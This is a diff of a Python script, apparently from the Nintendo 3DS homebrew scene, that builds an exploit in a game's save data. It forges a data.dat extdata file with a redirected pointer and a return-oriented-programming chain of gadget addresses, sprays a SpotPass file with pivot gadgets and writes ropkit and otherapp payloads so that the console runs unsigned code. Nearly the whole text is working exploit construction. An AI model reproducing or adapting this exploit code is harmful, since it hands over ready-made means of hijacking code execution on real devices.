@@ -1,73 +1,90 @@
 import os,sys,struct
 #1bf70
-size=0x127c1c  #size of data.dat
-d=0x33333333   #fuzz filler base value
-out=bytearray(size)  #will become "data.dat" extdata file shortly, where our exploit lives. Love that filename because I love.lov it.
+size=0x127c1c
+d=0x33333333
+out=bytearray(size)
 OFFSET=0
 
-redirect_offs=0x1bf5c  			#data.dat offset, this is where exploit begins when this pointer is redirected (pointer is hidden with a conversion algo, see addr_convert)
-linearmem_target=0x1574e790  	#start of initial takeover rop
-pop_r4r7pc=0x100e60  			#pop {r4, r5, r6, r7, pc}  # pc of initial pivot
-pivot_args=0x244e08  			#ldm r0, {r0, r1} ; ldr r2, [r0] ; ldr r2, [r2, #0xc] ; blx r2   setup r0/r1 for below stack pivot
-pivot=0x12f6c0  				#mov sp, r0 ; mov r0, r2 ; mov lr, r3 ; bx r1
+spotpass=bytearray(0x3000)
+for i in range(0,0x3000-1,4):
+	temp=0x3000-i
+	spotpass[i:i+4]=struct.pack("<I",temp)
+	
+for i in range(0,0x2840-1,4):
+	temp=0x2840-i
+	spotpass[i:i+4]=struct.pack("<I",temp)
 
-PAYLOAD_ADDR=0x1579e080  #ropkit to pivot to, finishing stage0. ropkit is embedded in the spotpass file  (weird charactor name inside boss/
-POP_R1PC=0x00109d6c
+redirect_offs=0x1bf5c
+linearmem_target=0x1574ed10 #1574ff10-ESP #1574f610-FRA #1574f810-GER #0ffffc58-15750190-ITL #1574f290-NED #1574f990-POR #1574f290-CYR   #0x1574d010-???
+linearmem_target=0x1574ed10 #44440600-ESP #44440f00-FRA #44440d00-GER #0ffffc58-15750190-ITL #44441280-NED #44440b80-POR #44441280-CYR
+pop_r4r7pc=0x100e60  #pop {r4, r5, r6, r7, pc}  # pc of initial pivot
+pivot_args=0x244e08  #ldm r0, {r0, r1} ; ldr r2, [r0] ; ldr r2, [r2, #0xc] ; blx r2   setup r0/r1 for below stack pivot
+pivot=0x12f6c0       #mov sp, r0 ; mov r0, r2 ; mov lr, r3 ; bx r1
+pivot_r3=0x1144e4
+
+PAYLOAD_ADDR=0x1579e600+0x800 #0x1579F500  1579c000
+PAYLOAD_ADDR=0x1579e080+0xf00 #1579EF80 ropkit to pivot to, finishing stage0. ropkit is embedded in the spotpass file  (weird charactor name inside boss/
+POP_R1PC=0x00109d6c           #1800-eng 1200-fra 0800-esp 1800-por
 POP_R0PC=0x0011a698
 ROP_POPPC=0x001017b8
+GARBAGE=0x44444444
 
-#0179d80c 1579d80c
+#0179d80c 1579d80c 0x103704: pop {r4, lr} ; bx r1 ; (106 found)
 
 def write32(offset, value):
 	global out
 	out[offset:offset+4]=struct.pack("<I",value)
 	
-#simple rop chain maker
 def rop(value):
 	global out, OFFSET
 	out[OFFSET:OFFSET+4]=struct.pack("<I",value)
 	OFFSET+=4
 	
-#possible address obfuscation undoing function. did that sentence make any sense? lol
 def addr_convert(addr):
 	c=(addr - 0x678d88) // 8
 	print(hex(c))
 	return c
 	
 
-
-for i in range(0,size-1,4):  #fuzz code that fills data.dat. sequentially marked to track location in mem dumps
+for i in range(0,size-1,4):
 	temp=d+(i//4)
 	out[i:i+4]=struct.pack("<I",temp)
 	
-write32(redirect_offs, addr_convert(linearmem_target))  #apply inital redirect and point to the ropchain below. we're right next to an r1 branch in abount 4-5 instructions!
+write32(redirect_offs, addr_convert(PAYLOAD_ADDR))
 
-out[0x1bf70:0x1bf70+0x20]=b"\x00"*0x20   #this 0x20 byte null array is close to the redirect address and seems to keep some addresses from crashing
+out[0x1bf70:0x1bf70+0x20]=b"\x00"*0x20
+
+webstrand=struct.pack("<IIIII", PAYLOAD_ADDR, pop_r4r7pc, pivot_args, pivot, pivot_r3)
+
+for i in range(0x2800, 0x3000-4, 4):
+	spotpass[i:i+4]=struct.pack("<I", ROP_POPPC)
+
+for i in range(0, 0x2800-1, 0x20):
+	spotpass[i:i+0x14]=webstrand
 	
-OFFSET=0x1bf90         #ROPCHAIN - take control then pivot to ropkit that's embedded in spotpass data
-rop(linearmem_target)
-rop(pop_r4r7pc)
-rop(pivot_args)
-rop(pivot)
-rop(POP_R0PC)
-rop(PAYLOAD_ADDR)
-rop(POP_R1PC)
-rop(ROP_POPPC)
-rop(pivot)
 
-#data.dat is a bad candidate for "piggybacking" further data because the game randomly copies 00s over it in many spots. we'll use spotpass data instead, even though it forces users to leave wifi off, lol (because of overwrite risk).
-
-#summary: concat ropkit and otherapp and place into the spotpass file, then the exploit code into data.dat
-with open("3ds_ropkit/otherapp.bin","rb") as f:  
-	oapp=f.read()
-	
 with open("3ds_ropkit/ropkit.bin","rb") as f:
-	ropkit=f.read()
-	ropkit+=(b"\x00"*(0x400-len(ropkit)))
+	ropkit=f.read(0x1000)
+with open("3ds_ropkit/otherapp.bin","rb") as f:
+	oapp=f.read()+b"\x00"*0x1000
+	oapp=oapp[:0x2000] #lazy padding strategy but don't care
+with open("3ds_ropkit/otherappn.bin","rb") as f:
+	oappn=f.read()+b"\x00"*0x1000
+	oappn=oappn[:0x2000]
+print("ropkit:%x  +otherapp_old:%x" % (len(ropkit), len(ropkit+oapp)))
 
-with open("308/boss/wTRu2!!!(`!!+s(@","rb+") as f: #i can't pronounce that spotpass file's name, any ideas?
-	f.seek(0x1000-0xc)
-	f.write(ropkit+oapp)
+with open("loader/ropkit.bin","rb") as f:
+	loader=f.read()
+
+with open("308/boss/wTRu2!!!(`!!+s(@","rb+") as f:
+	f.seek(0x700-0xc)
+	f.write(spotpass)
+	f.seek(0x700-0xc+0x2c00)
+	f.write(loader)
+
+payload=ropkit+oapp+oappn
+with open("308/user/ubll.lst","wb") as f:
+	f.write(payload)
 
 with open("308/user/data.dat","wb") as f:
 	f.write(out)
